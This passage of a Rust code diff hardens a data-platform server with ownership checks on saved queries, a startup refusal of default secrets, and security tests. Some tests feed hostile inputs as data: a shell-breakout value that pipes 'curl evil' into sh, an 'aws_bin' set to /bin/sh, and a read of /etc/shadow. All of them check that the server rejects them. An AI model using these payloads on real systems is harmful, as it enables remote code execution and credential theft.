+        owner: claims.sub.clone(),
     };
     st.queries.lock().unwrap().push(q.clone());
     st.save_queries();
@@ -1966,42 +2447,60 @@ async fn create_query(State(st): State<AppState>, Json(b): Json<CreateQuery>) ->
 
 async fn get_query(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<SavedQuery>, (StatusCode, String)> {
-    st.queries
-        .lock()
-        .unwrap()
-        .iter()
-        .find(|q| q.id == id)
-        .cloned()
-        .map(Json)
-        .ok_or((StatusCode::NOT_FOUND, format!("no query `{id}`")))
+    let qs = st.queries.lock().unwrap();
+    match qs.iter().find(|q| q.id == id) {
+        Some(q) if crate::authz::owns_or_admin(&st, &claims, &q.owner) => Ok(Json(q.clone())),
+        _ => Err((StatusCode::NOT_FOUND, format!("no query `{id}`"))),
+    }
 }
 
 async fn save_query(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
     Json(mut q): Json<SavedQuery>,
-) -> Json<serde_json::Value> {
-    q.id = id.clone();
-    q.updated_at = now_iso();
+) -> Result<Json<serde_json::Value>, StatusCode> {
     {
         let mut qs = st.queries.lock().unwrap();
         match qs.iter_mut().find(|x| x.id == id) {
-            Some(slot) => *slot = q.clone(),
-            None => qs.push(q.clone()),
+            Some(slot) => {
+                if !crate::authz::owns_or_admin(&st, &claims, &slot.owner) {
+                    return Err(StatusCode::NOT_FOUND);
+                }
+                q.owner = slot.owner.clone();
+                q.id = id.clone();
+                q.updated_at = now_iso();
+                *slot = q.clone();
+            }
+            None => {
+                q.owner = claims.sub.clone();
+                q.id = id.clone();
+                q.updated_at = now_iso();
+                qs.push(q.clone());
+            }
         }
     }
     st.save_queries();
-    Json(serde_json::json!({ "ok": true, "savedAt": q.updated_at }))
+    Ok(Json(serde_json::json!({ "ok": true, "savedAt": q.updated_at })))
 }
 
-async fn delete_query(State(st): State<AppState>, Path(id): Path<String>) -> StatusCode {
+async fn delete_query(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Path(id): Path<String>,
+) -> StatusCode {
     let removed = {
         let mut qs = st.queries.lock().unwrap();
-        let before = qs.len();
-        qs.retain(|q| q.id != id);
-        before != qs.len()
+        match qs.iter().find(|q| q.id == id) {
+            Some(q) if crate::authz::owns_or_admin(&st, &claims, &q.owner) => {
+                qs.retain(|q| q.id != id);
+                true
+            }
+            _ => false,
+        }
     };
     if removed {
         st.save_queries();
@@ -2160,6 +2659,30 @@ pub async fn serve(addr: &str) -> std::io::Result<()> {
     let password = std::env::var("WEFT_ADMIN_PASSWORD").unwrap_or_else(|_| "admin".into());
     let secret =
         std::env::var("WEFT_JWT_SECRET").unwrap_or_else(|_| "weft-dev-secret-change-me".into());
+    // SECURITY: refuse to boot with break-glass defaults unless explicitly in dev mode. A weak or
+    // known JWT secret lets anyone forge an `admins` token (every authz check downstream trusts the
+    // `sub`); a default admin password is an open front door. `WEFT_DEV_MODE=1` opts into the
+    // insecure local-dev defaults.
+    let dev_mode = matches!(
+        std::env::var("WEFT_DEV_MODE").as_deref(),
+        Ok("1") | Ok("true") | Ok("yes")
+    );
+    if !dev_mode {
+        if secret.len() < 32 || secret == "weft-dev-secret-change-me" {
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                "WEFT_JWT_SECRET must be set to a strong value (≥32 bytes) in production; \
+                 set WEFT_DEV_MODE=1 to allow the insecure default for local development",
+            ));
+        }
+        if password == "admin" {
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                "WEFT_ADMIN_PASSWORD must be changed from the default in production; \
+                 set WEFT_DEV_MODE=1 to allow it for local development",
+            ));
+        }
+    }
     let web_dir =
         PathBuf::from(std::env::var("WEFT_WEB_DIR").unwrap_or_else(|_| "web/dist".into()));
     // Cluster runtime: the `weft` binary to spawn per cluster, and the host advertised in the
@@ -2256,6 +2779,349 @@ mod tests {
             return None;
         }
         body_json(resp).await["token"].as_str().map(String::from)
+    }
+
+    /// Admin-only helper: create a (possibly non-admin) user and return the response status.
+    async fn create_user_via_admin(
+        st: &AppState,
+        admin_token: &str,
+        user: &str,
+        pass: &str,
+        groups: &[&str],
+    ) -> StatusCode {
+        let groups_json = serde_json::to_string(groups).unwrap();
+        app(st.clone())
+            .oneshot(
+                Request::post("/api/admin/users")
+                    .header("content-type", "application/json")
+                    .header("authorization", format!("Bearer {admin_token}"))
+                    .body(Body::from(format!(
+                        r#"{{"username":"{user}","password":"{pass}","groups":{groups_json}}}"#
+                    )))
+                    .unwrap(),
+            )
+            .await
+            .unwrap()
+            .status()
+    }
+
+    async fn post(st: &AppState, path: &str, token: &str, body: &str) -> StatusCode {
+        app(st.clone())
+            .oneshot(
+                Request::post(path)
+                    .header("content-type", "application/json")
+                    .header("authorization", format!("Bearer {token}"))
+                    .body(Body::from(body.to_string()))
+                    .unwrap(),
+            )
+            .await
+            .unwrap()
+            .status()
+    }
+
+    /// Register a governed three-level table `main.sales.monthly_revenue` directly on the engine so
+    /// the governance test has a table in a named (non-default) catalog to authorize. Main's engine
+    /// seeds no local data (catalogs come from Glue), so the test sets up exactly what it needs.
+    fn seed_governed_table(st: &AppState) {
+        use datafusion::catalog::{CatalogProvider, MemoryCatalogProvider, MemorySchemaProvider, SchemaProvider};
+        use datafusion::datasource::MemTable;
+        use weft_loom::arrow::array::{Float64Array, StringArray};
+        use weft_loom::arrow::datatypes::{DataType, Field, Schema};
+        use weft_loom::arrow::record_batch::RecordBatch;
+
+        let batch = RecordBatch::try_new(
+            Arc::new(Schema::new(vec![
+                Field::new("month", DataType::Utf8, false),
+                Field::new("region", DataType::Utf8, false),
+                Field::new("revenue", DataType::Float64, false),
+            ])),
+            vec![
+                Arc::new(StringArray::from(vec!["2026-01", "2026-01", "2026-02"])),
+                Arc::new(StringArray::from(vec!["US", "EU", "US"])),
+                Arc::new(Float64Array::from(vec![120000.0, 88000.0, 135000.0])),
+            ],
+        )
+        .unwrap();
+        let table = Arc::new(MemTable::try_new(batch.schema(), vec![vec![batch]]).unwrap());
+        let schema = Arc::new(MemorySchemaProvider::new());
+        schema
+            .register_table("monthly_revenue".to_string(), table)
+            .unwrap();
+        let catalog = Arc::new(MemoryCatalogProvider::new());
+        catalog.register_schema("sales", schema).unwrap();
+        let _ = st.engine.ctx().register_catalog("main", catalog);
+    }
+
+    #[test]
+    fn connection_validation_rejects_injection_and_unknown_keys() {
+        let opt = |pairs: &[(&str, &str)]| -> HashMap<String, String> {
+            pairs
+                .iter()
+                .map(|(k, v)| (k.to_string(), v.to_string()))
+                .collect()
+        };
+        // Valid baselines pass.
+        assert!(validate_connection("glue", "sales", &opt(&[("region", "us-east-1")])).is_ok());
+        assert!(
+            validate_connection("hive", "warehouse", &opt(&[("uri", "thrift://hms:9083")])).is_ok()
+        );
+        // RCE #2: a request-supplied `aws_bin` (or any *_bin/_path/_cmd/_endpoint key) is rejected,
+        // so it can never reach `Command::new(...)` in the Glue catalog.
+        assert!(validate_connection("glue", "sales", &opt(&[("aws_bin", "/bin/sh")])).is_err());
+        assert!(validate_connection("glue", "sales", &opt(&[("helper_path", "/x")])).is_err());
+        assert!(validate_connection("hive", "wh", &opt(&[("meta_endpoint", "x")])).is_err());
+        // Unknown keys are rejected, not silently ignored.
+        assert!(validate_connection(
+            "glue",
+            "sales",
+            &opt(&[("region", "us-east-1"), ("evil", "x")])
+        )
+        .is_err());
+        // Quote-breakout / shell-metachar payloads in a value are rejected (kept inert downstream).
+        assert!(validate_connection(
+            "hive",
+            "warehouse",
+            &opt(&[("uri", "thrift://h:9083'; curl evil|sh; #")])
+        )
+        .is_err());
+        // Names that aren't DNS-1123 labels are rejected (SQL identifier + k8s object-name safety).
+        assert!(validate_connection("glue", "Sales DB", &opt(&[("region", "us-east-1")])).is_err());
+        assert!(validate_connection("glue", "../etc", &opt(&[("region", "us-east-1")])).is_err());
+        // Unsupported kind.
+        assert!(validate_connection("redis", "x", &HashMap::new()).is_err());
+    }
+
+    #[test]
+    fn ec2_user_data_keeps_catalog_conf_inert() {
+        // A connection value carrying a shell-breakout payload must NOT appear raw in the boot
+        // script; it is base64-encoded and decoded at runtime, so the shell never re-parses it.
+        let payload = "spark.sql.catalog.x.uri=thrift://h:9083'; curl evil|sh; #";
+        let ud = ec2_user_data("https://dl/weft", "us-west-2", payload);
+        assert!(
+            !ud.contains("'; curl evil|sh"),
+            "raw payload leaked into boot script:\n{ud}"
+        );
+        assert!(!ud.contains("evil|sh"), "no raw payload anywhere:\n{ud}");
+        assert!(ud.contains("base64 -d"), "conf must be decoded from base64");
+        assert!(
+            ud.contains(&base64_encode(payload.as_bytes())),
+            "conf must be carried as its base64"
+        );
+        // Operator-controlled values are present (not an injection vector).
+        assert!(ud.contains("AWS_REGION='us-west-2'"));
+    }
+
+    #[test]
+    fn session_id_is_per_user_and_stable() {
+        assert_eq!(session_id_for("alice", "c1"), session_id_for("alice", "c1"));
+        assert_ne!(session_id_for("alice", "c1"), session_id_for("bob", "c1"));
+        assert_ne!(session_id_for("alice", "c1"), session_id_for("alice", "c2"));
+        // No longer the old hardcoded shared id.
+        assert_ne!(
+            session_id_for("alice", "c1"),
+            "00112233-4455-6677-8899-aabbccddeeff"
+        );
+    }
+
+    #[tokio::test]
+    async fn non_admin_is_forbidden_from_privileged_actions() {
+        let st = state();
+        let admin = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        // Admin provisions a non-admin user (empty groups).
+        assert_eq!(
+            create_user_via_admin(&st, &admin, "bob", "bobpassword12", &[]).await,
+            StatusCode::CREATED
+        );
+        let bob = login_token(&st, "bob", "bobpassword12").await.unwrap();
+
+        // Every privileged control-plane mutation is 403 for a non-admin.
+        assert_eq!(
+            post(&st, "/api/clusters", &bob, r#"{"name":"x"}"#).await,
+            StatusCode::FORBIDDEN
+        );
+        assert_eq!(
+            post(
+                &st,
+                "/api/connections",
+                &bob,
+                r#"{"name":"glue1","kind":"glue","options":{"region":"us-east-1"}}"#
+            )
+            .await,
+            StatusCode::FORBIDDEN
+        );
+        assert_eq!(
+            post(
+                &st,
+                "/api/grants",
+                &bob,
+                r#"{"securable_type":"table","securable_name":"main.sales.orders","privilege":"SELECT","principal_kind":"group","principal_id":"x","effect":"allow"}"#
+            )
+            .await,
+            StatusCode::FORBIDDEN
+        );
+        assert_eq!(
+            post(
+                &st,
+                "/api/admin/users",
+                &bob,
+                r#"{"username":"x","password":"yyyyyyyyyyyy","groups":[]}"#
+            )
+            .await,
+            StatusCode::FORBIDDEN
+        );
+        // But a non-admin can still run SQL (not an admin-gated action).
+        assert_eq!(
+            post(&st, "/api/sql", &bob, r#"{"sql":"SELECT 1"}"#).await,
+            StatusCode::OK
+        );
+    }
+
+    #[tokio::test]
+    async fn non_admin_sql_is_governed() {
+        let st = state();
+        seed_governed_table(&st);
+        let admin = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        assert_eq!(
+            create_user_via_admin(&st, &admin, "carol", "passwordpassword", &[]).await,
+            StatusCode::CREATED
+        );
+        let carol = login_token(&st, "carol", "passwordpassword").await.unwrap();
+
+        let run = |token: String, sql: &str| {
+            let st = st.clone();
+            let body = format!(r#"{{"sql":{}}}"#, serde_json::to_string(sql).unwrap());
+            async move {
+                let resp = app(st)
+                    .oneshot(
+                        Request::post("/api/sql")
+                            .header("content-type", "application/json")
+                            .header("authorization", format!("Bearer {token}"))
+                            .body(Body::from(body))
+                            .unwrap(),
+                    )
+                    .await
+                    .unwrap();
+                body_json(resp).await
+            }
+        };
+
+        // Without a grant, carol cannot read the governed table (fail-closed).
+        let j = run(carol.clone(), "SELECT * FROM main.sales.monthly_revenue").await;
+        assert!(
+            j["error"].as_str().unwrap_or("").contains("permission denied"),
+            "expected denial, got {j:?}"
+        );
+        // File-scan TVFs are blocked for non-admins (can't read raw files with engine creds).
+        let j = run(carol.clone(), "SELECT * FROM read_parquet('/etc/shadow')").await;
+        assert!(
+            j["error"].as_str().unwrap_or("").contains("not permitted"),
+            "expected TVF denial, got {j:?}"
+        );
+        // A bare scratch query (no governed table) is always allowed.
+        assert!(run(carol.clone(), "SELECT 1 AS a").await["error"].is_null());
+
+        // Admin grants ALL PRIVILEGES on catalog `main` → carol can now read it.
+        assert_eq!(
+            post(
+                &st,
+                "/api/grants",
+                &admin,
+                r#"{"securable_type":"catalog","securable_name":"main","privilege":"ALL PRIVILEGES","principal_kind":"user","principal_id":"carol","effect":"allow"}"#
+            )
+            .await,
+            StatusCode::CREATED
+        );
+        let j = run(
+            carol.clone(),
+            "SELECT region, sum(revenue) r FROM main.sales.monthly_revenue GROUP BY region",
+        )
+        .await;
+        assert!(j["error"].is_null(), "expected success after grant, got {j:?}");
+
+        // Admin is never blocked (owns the metastore).
+        let j = run(admin.clone(), "SELECT * FROM main.sales.monthly_revenue LIMIT 1").await;
+        assert!(j["error"].is_null(), "admin query failed: {j:?}");
+    }
+
+    #[tokio::test]
+    async fn notebooks_are_owner_isolated() {
+        let st = state();
+        let admin = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        for u in ["alice", "bob"] {
+            assert_eq!(
+                create_user_via_admin(&st, &admin, u, "passwordpassword", &[]).await,
+                StatusCode::CREATED
+            );
+        }
+        let alice = login_token(&st, "alice", "passwordpassword").await.unwrap();
+        let bob = login_token(&st, "bob", "passwordpassword").await.unwrap();
+
+        // Alice creates a notebook.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::post("/api/notebooks")
+                    .header("content-type", "application/json")
+                    .header("authorization", format!("Bearer {alice}"))
+                    .body(Body::from(r#"{"name":"secret nb"}"#))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        let id = body_json(resp).await["id"].as_str().unwrap().to_string();
+
+        let get = |token: String, path: String| {
+            let st = st.clone();
+            async move {
+                app(st)
+                    .oneshot(
+                        Request::get(path)
+                            .header("authorization", format!("Bearer {token}"))
+                            .body(Body::empty())
+                            .unwrap(),
+                    )
+                    .await
+                    .unwrap()
+            }
+        };
+
+        // IDOR: Bob cannot read Alice's notebook by id (404, not 403 — no existence leak).
+        assert_eq!(
+            get(bob.clone(), format!("/api/notebooks/{id}")).await.status(),
+            StatusCode::NOT_FOUND
+        );
+        // Bob's listing doesn't include it.
+        let list = body_json(get(bob.clone(), "/api/notebooks".into()).await).await;
+        assert!(list.as_array().unwrap().is_empty());
+        // Owner and admin can read it.
+        assert_eq!(
+            get(alice.clone(), format!("/api/notebooks/{id}"))
+                .await
+                .status(),
+            StatusCode::OK
+        );
+        assert_eq!(
+            get(admin.clone(), format!("/api/notebooks/{id}"))
+                .await
+                .status(),
+            StatusCode::OK
+        );
+        // Bob cannot delete it (404); it survives for Alice.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::delete(format!("/api/notebooks/{id}"))
+                    .header("authorization", format!("Bearer {bob}"))
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
+        assert_eq!(
+            get(alice.clone(), format!("/api/notebooks/{id}"))
+                .await
+                .status(),
+            StatusCode::OK
+        );
     }
 
     #[tokio::test]
